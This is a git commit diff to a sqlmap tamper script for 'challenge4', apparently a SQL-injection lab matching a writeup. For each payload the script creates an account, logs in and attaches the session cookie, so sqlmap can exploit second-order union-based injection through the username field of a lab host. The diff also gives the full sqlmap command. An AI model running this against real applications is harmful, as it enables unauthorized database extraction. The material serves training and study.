04b0111772c48a399587d249be000a95f588cd4c
xistens <cssparta@gmail.com>
2020-12-12 12:55:23 +0100

    Updated extra scripts to match the writeup

--- scripts/challenge4/so-tamper.py
+++ scripts/challenge4/so-tamper.py
@@ -1,33 +1,35 @@
 #!/usr/bin/python
 import requests
-import re
 from lib.core.enums import PRIORITY
 __priority__ = PRIORITY.NORMAL
 """
-sqlmap --tamper so-tamper.py -r register.req --second-url http://127.0.0.1:5000/notes -p username --dbms sqlite --proxy http://127.0.0.1:8080 --technique=U
+sqlmap --tamper so-tamper.py --url http://10.10.1.134:5000/challenge4/signup --data "username=admin&password=asd" --second-url http://10.10.1.134:5000/challenge4/notes -p username --dbms=sqlite --technique=U
 
---tamper so-tamper.py - The tamper script
--r register.req - Request from Burp. Makes sure that the password is the same as in the tamper script
---second-url http://127.0.0.1:5000/notes - Visit this URL to check for results
--p username - The parameter to inject to
---dbms sqlite - To speed things up
---proxy http://127.0.0.1:8080 - Can be used to analyze requests with Burp
---technique=U - The technique to use. [U]nion-based
+# --tamper so-tamper.py - The tamper script
+# --url - The URL of the injection point, which is /signup in this case
+# --data - The POST data from the registraion form to /signup.
+# Password must be the same as the password in the tamper script
+# --second-url http://10.10.1.134:5000/challenge4/notes - Visit this URL to check for results
+# -p username - The parameter to inject to
+# --dbms=sqlite - To speed things up
+# --technique=U - The technique to use. [U]nion-based
+# --no-cast - Turn off payload casting mechanism
 """
+address = "http://10.10.1.134:5000/challenge4"
+password = "asd"
+
 def dependencies():
     pass
 
 def create_account(payload):
     with requests.Session() as s:
-        data = {"username": payload, "password": "asd"}
-        proxies = {"http": "http://127.0.0.1:8080"}
-        resp = s.post("http://127.0.0.1:5000/signup", data=data, proxies=proxies)
+        data = {"username": payload, "password": password}
+        resp = s.post(f"{address}/signup", data=data)
 
 def login(payload):
     with requests.Session() as s:
-        data = {"username": payload, "password": "asd"}
-        proxies = {"http": "http://127.0.0.1:8080"}
-        resp = s.post("http://127.0.0.1:5000/login", data=data, proxies=proxies)
+        data = {"username": payload, "password": password}
+        resp = s.post(f"{address}/login", data=data)
         sessid = s.cookies.get("session", None)
     return "session={}".format(sessid)
 
@@ -38,5 +40,3 @@ def tamper(payload, **kwargs):
     headers["Cookie"] = login(payload)
     return payload
 
-if __name__ == "__main__":
-    login("test")
